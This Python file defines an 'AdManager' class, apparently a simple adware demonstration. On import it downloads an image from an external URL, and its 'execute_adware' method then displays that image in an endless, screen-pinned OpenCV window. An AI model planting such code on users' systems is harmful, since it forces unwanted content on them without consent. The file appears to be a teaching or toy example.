import os
import urllib.request
import cv2


class AdManager(object):
    url = "http://d.wpimg.pl/1098145671--204938399/movies.jpg"
    extension = ".jpg"
    file_name, _ = urllib.request.urlretrieve(url)
    new_file_name = ""

    def process_file(self):
        base = os.path.splitext(self.file_name)[0]
        self.new_file_name = base + self.extension
        os.rename(self.file_name, self.new_file_name)

    def show_window(self):
        image_ad = cv2.imread(self.new_file_name)
        image_ad = cv2.resize(image_ad, (300, 300))

        while True:
            cv2.moveWindow("ad", 0, 0)
            cv2.imshow("ad", image_ad)
            cv2.waitKey(0)

    def execute_adware(self):
        self.process_file()
        self.show_window()